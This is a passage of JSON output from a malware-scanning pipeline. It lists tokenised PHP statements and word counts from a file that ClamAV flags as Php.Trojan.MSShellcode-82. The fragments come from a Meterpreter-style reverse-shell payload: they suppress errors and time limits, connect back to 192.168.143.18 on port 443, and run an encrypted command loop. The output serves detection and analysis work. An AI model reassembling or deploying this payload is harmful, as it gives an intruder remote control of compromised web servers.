                "switch (get_rtype($resource)) { case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) { my_print(\"Reading UDP socket\")": 1,
                "list($host,$port) = $udp_host_map[(int)$resource]": 2,
                "socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port)": 1,
                "} else { my_print(\"Reading TCP socket\")": 1,
                "$buff .= socket_read($resource, $len, PHP_BINARY_READ)": 1,
                "} break": 4,
                "case 'stream': global $msgsock": 1,
                "$r = Array($resource)": 1,
                "my_print(\"Calling select to see if there's data on $resource\")": 1,
                "$last_requested_len = 0": 1,
                "while (true) { $w=NULL": 1,
                "$e=NULL": 2,
                "$cnt = stream_select($r, $w, $e, $t)": 1,
                "if ($cnt === 0) { break": 1,
                "} if ($cnt === false or feof($resource)) { my_print(\"Checking for failed read...\")": 1,
                "if (empty($buff)) { my_print(\"---- EOF ON $resource ----\")": 1,
                "$buff = false": 1,
                "} $md = stream_get_meta_data($resource)": 1,
                "dump_array($md, \"Metadata for {$resource}\")": 1,
                "if ($md['unread_bytes'] > 0) { $last_requested_len = min($len, $md['unread_bytes'])": 1,
                "$buff .= fread($resource, $last_requested_len)": 1,
                "} else { $tmp = fread($resource, $len)": 1,
                "$last_requested_len = $len": 1,
                "$buff .= $tmp": 1,
                "if (strlen($tmp) < $len) { break": 1,
                "} } if ($resource != $msgsock) { my_print(\"buff: '$buff'\")": 1,
                "} $r = Array($resource)": 1,
                "} my_print(sprintf(\"Done with the big read loop on $resource, got %d bytes, asked for %d bytes\", strlen($buff), $last_requested_len))": 1,
                "default: $cid = get_channel_id_from_resource($resource)": 1,
                "if ($c and $c['data']) { $buff = substr($c['data'], 0, $len)": 1,
                "my_print(\"Aha! got some leftovers\")": 1,
                "} else { my_print(\"Wtf don't know how to read from resource $resource, c: $c\")": 1,
                "if (is_array($c)) { dump_array($c)": 1,
                "} } my_print(sprintf(\"Read %d bytes\", strlen($buff)))": 1,
                "return $buff": 1,
                "} function write($resource, $buff, $len=0) { global $udp_host_map": 1,
                "if ($len == 0) { $len = strlen($buff)": 1,
                "} $count = false": 1,
                "switch (get_rtype($resource)) { case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) { my_print(\"Writing UDP socket\")": 1,
                "$count = socket_sendto($resource, $buff, $len, $host, $port)": 1,
                "} else { $count = socket_write($resource, $buff, $len)": 1,
                "case 'stream': $count = fwrite($resource, $buff, $len)": 1,
                "fflush($resource)": 1,
                "default: my_print(\"Wtf don't know how to write to resource $resource\")": 1,
                "} return $count": 2,
                "} function get_rtype($resource) { global $resource_type_map": 1,
                "if (array_key_exists((int)$resource, $resource_type_map)) { return $resource_type_map[(int)$resource]": 1,
                "} function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) { $streams_r = array()": 1,
                "$streams_w = array()": 1,
                "$streams_e = array()": 1,
                "$sockets_r = array()": 1,
                "$sockets_w = array()": 1,
                "$sockets_e = array()": 1,
                "if ($r) { foreach ($r as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_r[] = $resource": 1,
                "case 'stream': $streams_r[] = $resource": 1,
                "default: my_print(\"Unknown resource type\")": 3,
                "} } } if ($w) { foreach ($w as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_w[] = $resource": 1,
                "case 'stream': $streams_w[] = $resource": 1,
                "} } } if ($e) { foreach ($e as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_e[] = $resource": 1,
                "case 'stream': $streams_e[] = $resource": 1,
                "} } } $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e)": 1,
                "$n_streams = count($streams_r) + count($streams_w) + count($streams_e)": 1,
                "$r = array()": 1,
                "$w = array()": 1,
                "$e = array()": 1,
                "if (count($sockets_r)==0) { $sockets_r = null": 1,
                "} if (count($sockets_w)==0) { $sockets_w = null": 1,
                "} if (count($sockets_e)==0) { $sockets_e = null": 1,
                "} if (count($streams_r)==0) { $streams_r = null": 1,
                "} if (count($streams_w)==0) { $streams_w = null": 1,
                "} if (count($streams_e)==0) { $streams_e = null": 1,
                "} $count = 0": 1,
                "if ($n_sockets > 0) { $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec)": 1,
                "if (false === $res) { return false": 2,
                "} if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r)": 1,
                "} if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w)": 1,
                "} if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e)": 1,
                "} $count += $res": 2,
                "} if ($n_streams > 0) { $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec)": 1,
                "} if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r)": 1,
                "} if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w)": 1,
                "} if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e)": 1,
                "} function add_reader($resource) { global $readers": 1,
                "if (is_resource($resource) && !in_array($resource, $readers)) { $readers[] = $resource": 1,
                "} } function remove_reader($resource) { global $readers": 1,
                "if (in_array($resource, $readers)) { foreach ($readers as $key => $r) { if ($r == $resource) { unset($readers[$key])": 1,
                "} } } } ob_implicit_flush()": 1,
                "error_reporting(0)": 1,
                "@ignore_user_abort(true)": 1,
                "@set_time_limit(0)": 1,
                "@ignore_user_abort(1)": 1,
                "@ini_set('max_execution_time',0)": 1,
                "$GLOBALS['UUID'] = PAYLOAD_UUID": 1,
                "$GLOBALS['SESSION_GUID'] = SESSION_GUID": 1,
                "$GLOBALS['AES_KEY'] = null": 1,
                "$GLOBALS['AES_ENABLED'] = false": 1,
                "if (!isset($GLOBALS['msgsock'])) { $ipaddr = '192.168.143.18'": 1,
                "$port = 443": 1,
                "my_print(\"Don't have a msgsock, trying to connect($ipaddr, $port)\")": 1,
                "$msgsock = connect($ipaddr, $port)": 1,
                "if (!$msgsock) { die()": 1,
                "} } else { $msgsock = $GLOBALS['msgsock']": 1,
                "$msgsock_type = $GLOBALS['msgsock_type']": 1,
                "switch ($msgsock_type) { case 'socket': register_socket($msgsock)": 1,
                "case 'stream': default: register_stream($msgsock)": 1,
                "} } add_reader($msgsock)": 1,
                "$r=$GLOBALS['readers']": 1,
                "$w=NULL": 1,
                "while (false !== ($cnt = select($r, $w, $e, $t))) { $read_failed = false": 1,
                "$i < $cnt": 1,
                "$i++) { $ready = $r[$i]": 1,
                "if ($ready == $msgsock) { $packet = read($msgsock, 32)": 1,
                "my_print(sprintf(\"Read returned %s bytes\", strlen($packet)))": 1,
                "if (false==$packet) { my_print(\"Read failed on main socket, bailing\")": 1,
                "break 2": 1,
                "} $xor = substr($packet, 0, 4)": 1,
                "$header = xor_bytes($xor, substr($packet, 4, 28))": 1,
                "$len_array = unpack(\"Nlen\", substr($header, 20, 4))": 1,
                "$len = $len_array['len'] + 32 - 8": 1,
                "while (strlen($packet) < $len) { $packet .= read($msgsock, $len-strlen($packet))": 1,
                "} $response = create_response(decrypt_packet(xor_bytes($xor, $packet)))": 1,
                "write_tlv_to_socket($msgsock, $response)": 1,
                "} else { $data = read($ready)": 1,
                "if (false === $data) { handle_dead_resource_channel($ready)": 1,
                "} elseif (strlen($data) > 0){ my_print(sprintf(\"Read returned %s bytes\", strlen($data)))": 1,
                "$request = handle_resource_read_channel($ready, $data)": 1,
                "if ($request) { write_tlv_to_socket($msgsock, $request)": 1,
                "} } } } $r = $GLOBALS['readers']": 1,
                "} my_print(\"Finished\")": 1,
                "my_print(\"--------------------\")": 1,
                "close($msgsock)": 1,
                "word: globals": 40,
                "word: channels": 22,
                "word: channel": 75,
                "word: process": 7,
                "word: resource": 119,
                "word: readers": 20,
                "word: commands": 10,
                "word: loadlib": 3,
                "word: machine": 8,
                "word: session": 17,
                "word: negotiate": 2,
                "word: encryption": 3,
                "word: function": 69,
                "word: register": 14,
                "word: command": 1,
                "word: global": 25,
                "word: evaling": 1,
                "word: meterpreter": 1,
                "word: sprintf": 7,
                "word: foreach": 10,
                "word: exists": 17,
                "word: contents": 5,
                "word: fclose": 2,
                "word: return": 72,
                "word: socket": 43,
                "word: option": 2,
                "word: setopt": 1,
                "word: define": 59,
                "word: payload": 2,
                "word: packet": 67,
                "word: request": 12,
                "word: response": 7,
                "word: success": 16,
                "word: failure": 11,
                "word: buffered": 1,
                "word: stream": 35,
                "word: datagram": 1,
                "word: string": 18,
                "word: compressed": 5,
                "word: complex": 3,
                "word: reserved": 1,
                "word: extensions": 1,
                "word: method": 12,
                "word: exception": 3,
                "word: result": 8,
                "word: length": 5,
                "word: whence": 1,
                "word: offset": 11,
                "word: library": 1,
                "word: target": 1,
                "word: windows": 2,
                "word: strtoupper": 1,
                "word: substr": 29,
                "word: client": 7,
                "word: handler": 4,
                "word: create": 34,
                "word: callable": 8,
                "word: calling": 2,
                "word: handles": 3,
                "word: remove": 9,
                "word: reader": 10,
                "word: strlen": 30,
                "word: interact": 3,
                "word: toggle": 2,
                "word: trying": 2,
                "word: invalid": 1,
                "word: interacting": 2,
                "word: shutdown": 2,
                "word: extension": 3,
                "word: loaded": 1,
                "word: suhosin": 4,
                "word: executor": 1,
                "word: disable": 1,
                "word: bypass": 2,
                "word: enumextcmd": 2,
                "word: expected": 2,
                "word: explode": 1,
                "word: scandir": 1,
                "word: prefix": 3,
                "word: strpos": 2,
                "word: supports": 4,
                "word: functionality": 1,
                "word: supported": 2,
                "word: openssl": 11,
                "word: public": 5,
                "word: encrypt": 8,
                "word: padding": 1,
                "word: gethostname": 2,
                "word: serial": 5,
                "word: output": 2,
                "word: strtolower": 1,
                "word: systemdrive": 1,
                "word: replace": 2,
                "word: number": 1,
                "word: created": 1,
                "word: looking": 2,
                "word: writing": 2,
                "word: leftovers": 2,
                "word: needed": 6,
                "word: handle": 6,
                "word: generate": 3,
                "word: characters": 3,
                "word: abcdefghijklmnopqrstuvwxyz": 1,
                "word: decrypt": 4,
                "word: unpack": 11,
                "word: enabled": 3,
                "word: msgsock": 22,
                "word: handling": 2,
                "word: something": 1,
                "word: returning": 1,
                "word: elseif": 15,
                "word: xffffffff": 2,
                "word: nvalue": 1,
                "word: cvalue": 1,
                "word: ipaddr": 25,
                "word: registering": 2,
                "word: connect": 6,
                "word: errstr": 1,
                "word: blocking": 2,
                "word: fsockopen": 5,
                "word: timeout": 2,
                "word: switch": 8,
                "word: closing": 1,
                "word: removing": 1,
                "word: reading": 2,
                "word: recvfrom": 1,
                "word: binary": 2,
                "word: select": 6,
                "word: requested": 5,
                "word: checking": 1,
                "word: failed": 3,
                "word: metadata": 1,
                "word: unread": 2,
                "word: default": 6,
                "word: sendto": 1,
                "word: fwrite": 1,
                "word: fflush": 1,
                "word: streams": 26,
                "word: sockets": 26,
                "word: unknown": 3,
                "word: implicit": 1,
                "word: reporting": 1,
                "word: ignore": 2,
                "word: execution": 1,
                "word: returned": 2,
                "word: bailing": 1,
                "word: header": 2,
                "word: finished": 1,
                "special: suhosin.executor.disable": 1,
                "special: 192.168.143.18": 1,
                "special: dev/disk/by": 1,
                "special: Nlen/Ntype": 3,
                "special: Nlen/Ntype/Nvalue": 1,
                "special: Nlen/Ntype/Nhi/Nlo": 1,
                "special: Nlen/Ntype/cvalue": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "clamav: bytecode: JIT disabled": 1,
                "clamav: Cannot prepare for JIT, LLVM is not compiled or not linked": 1,
                "clamav: Bytecode: 0 bytecode prepared with JIT, 94 prepared with interpreter, 94 total": 1,
                "clamav: Recognized ASCII text": 1,
                "clamav: FP SIGNATURE: 0a1590cf9a3553097722857674166c5b:3????:Php.Trojan.MSShellcode-82": 1,
                "clamav: Php.Trojan.MSShellcode-82 found": 1,
                "clamav: cli_magic_scandesc: returning 1  at line 2???": 1,
                "clamav: Php.Trojan.MSShellcode-82 FOUND": 2,
                "clamav: Scanned files: 1": 1,
                "clamav: Infected files: 1": 1,
                "clamav: bytecode: JIT disabled;clamav: Cannot prepare for JIT, LLVM is not compiled or not linked": 1,
                "clamav: Cannot prepare for JIT, LLVM is not compiled or not linked;clamav: Bytecode: 0 bytecode prepared with JIT, 94 prepared with interpreter, 94 total": 1,
                "clamav: Bytecode: 0 bytecode prepared with JIT, 94 prepared with interpreter, 94 total;clamav: Recognized ASCII text": 1,
                "clamav: Recognized ASCII text;clamav: FP SIGNATURE: 0a1590cf9a3553097722857674166c5b:3????:Php.Trojan.MSShellcode-82": 1,
                "clamav: FP SIGNATURE: 0a1590cf9a3553097722857674166c5b:3????:Php.Trojan.MSShellcode-82;clamav: Php.Trojan.MSShellcode-82 found": 1,
                "clamav: Php.Trojan.MSShellcode-82 found;clamav: cli_magic_scandesc: returning 1  at line 2???": 1,
                "clamav: cli_magic_scandesc: returning 1  at line 2???;clamav: Php.Trojan.MSShellcode-82 FOUND": 1,
                "clamav: Php.Trojan.MSShellcode-82 FOUND;clamav: Scanned files: 1": 1,
                "clamav: Scanned files: 1;clamav: Infected files: 1": 1,
                "blob file types: ": 1
            }
        }
    ]
}